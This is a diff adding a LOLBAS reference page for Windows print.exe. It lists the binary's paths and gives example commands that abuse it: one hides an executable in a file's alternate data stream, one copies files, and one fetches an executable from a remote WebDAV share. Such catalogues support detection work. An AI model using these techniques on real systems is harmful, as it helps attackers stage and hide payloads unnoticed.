@@ -31,7 +31,104 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Print/#ads">Alternate data streams</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Print/#copy">Copy</a></li>
+    
+</ul>
 
+<p>Used by Windows to send files to the printer.</p>
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\print.exe</li>
+	
+	<li>c:\windows\sysWOW64\print.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://twitter.com/Oddvarmoe/status/985518877076541440">https://twitter.com/Oddvarmoe/status/985518877076541440</a></li>
+	
+	<li><a href="https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410">https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> 
+
+<br>
+
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copy file.exe into the Alternate Data Stream (ADS) of file.txt.</p>
+
+        <pre><code>print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="copy" class="function-name">Copy</h2>
+
+<p>The LOLBAS can copy file.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe</p>
+
+        <pre><code>print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.</p>
+
+        <pre><code>print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
